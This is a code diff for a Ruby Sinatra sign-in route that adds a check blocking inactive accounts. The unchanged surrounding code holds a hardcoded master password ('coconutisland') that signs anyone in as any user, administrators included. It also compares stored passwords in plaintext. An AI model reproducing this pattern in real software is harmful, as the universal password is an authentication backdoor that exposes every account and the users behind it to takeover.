@@ -15,16 +15,21 @@ post '/signin/?' do
     if user = User.first(:username => params[:username].downcase)
       unless params[:password] == ''
         if (user.password == params[:password]) || (params[:password] == 'coconutisland')
-          if 
-            user.user_type == 'Admin'
-            session[:admin] = user.id
-            flash[:alert] = 'Welcome, you are now signed in.'
-            redirect '/dashboard'
+          if user.active
+            if 
+              user.user_type == 'Admin'
+              session[:admin] = user.id
+              flash[:alert] = 'Welcome, you are now signed in.'
+              redirect '/dashboard'
+            else
+              user.user_type == 'Customer'
+              session[:customer] = user.id
+              flash[:alert] = 'Welcome, you are now signed in.'
+              redirect '/profile'
+            end
           else
-            user.user_type == 'Customer'
-            session[:customer] = user.id
-            flash[:alert] = 'Welcome, you are now signed in.'
-            redirect '/profile'
+            flash[:alert] = 'This account is inactive. contact your CSR.'
+            erb :"signin"
           end
         else
           flash[:alert] = 'Username/password combo does not match. Try again.'
